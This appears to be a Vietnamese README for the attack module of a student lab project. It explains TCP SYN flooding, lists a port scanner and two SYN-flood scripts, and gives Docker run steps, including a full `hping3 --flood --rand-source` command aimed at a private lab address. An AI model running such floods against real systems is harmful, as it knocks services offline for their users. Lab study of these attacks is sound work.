# Module Tấn Công & Thăm Dò Mục Tiêu (Attacks Module)

Module này do **Thành viên 2** phụ trách, hiện thực hóa các yêu cầu chức năng **FR1 (Reconnaissance)** và **FR2 (Attack Execution)** trong tài liệu Báo cáo đồ án.

---

## 1. Cơ sở lý thuyết Bắt tay 3 bước TCP & Lỗ hổng SYN Flooding

```
Client (Attacker)                             Server (Victim)
       │                                             │
       │ ── 1. TCP SYN (cờ SYN=1, ACK=0) ──────────> │ (Cấp phát TCB trong RAM,
       │                                             │  đưa vào hàng đợi SYN_RECV)
       │ <─ 2. TCP SYN-ACK ───────────────────────── │
       │    (Gửi tới IP giả mạo ngoài Internet)      │
       │                                             │
       │ X  (Không bao giờ có gói ACK Bước 3)        │ (Kẹt ở SYN_RECV, chờ timeout)
       │                                             │ (Hàng đợi Backlog đầy -> DoS)
```

- **FR1 - Thăm dò & Xác định Mục tiêu (Reconnaissance):** Quét cổng TCP để xác định dịch vụ HTTP (Port 80) của máy chủ trước khi tấn công.
- **FR2 - Khởi tạo Lưu lượng Tấn công (Attack Execution):** Phát tán các gói tin TCP cờ `SYN=1`, ngụy tạo IP nguồn ngẫu nhiên (`IP Spoofing`) để ngăn chặn việc hoàn tất bắt tay 3 bước.

---

## 2. Danh mục công cụ trong Module

| Tệp tin | Yêu cầu | Mô tả kỹ thuật |
| :--- | :--- | :--- |
| `01_port_scan.py` | **FR1** | Script Python rà quét các cổng TCP phổ biến, xác định cổng 80/HTTP đang mở trên `192.168.100.10`. |
| `02_syn_flood_hping3.sh` | **FR2** | Thực thi `hping3 -S --flood -V -p 80 --rand-source 192.168.100.10` xả gói tin SYN ở tốc độ tối đa. |
| `03_syn_flood_scapy.py` | **FR2** | Script Python Scapy tự đóng gói Raw Packet IP/TCP tùy biến cờ SYN và hàm `generate_random_ip()`. |

---

## 3. Lệnh thực thi trên `attacker_node`

```bash
# 1. Truy cập container attacker
docker exec -it attacker_node bash

# 2. Bước 1: Quét cổng mục tiêu (FR1)
python3 /workspace/attacks/01_port_scan.py

# 3. Bước 2: Phát tán gói tin SYN Flooding bằng hping3 (FR2)
bash /workspace/attacks/02_syn_flood_hping3.sh

# Hoặc chạy kịch bản Scapy (FR2)
python3 /workspace/attacks/03_syn_flood_scapy.py
```
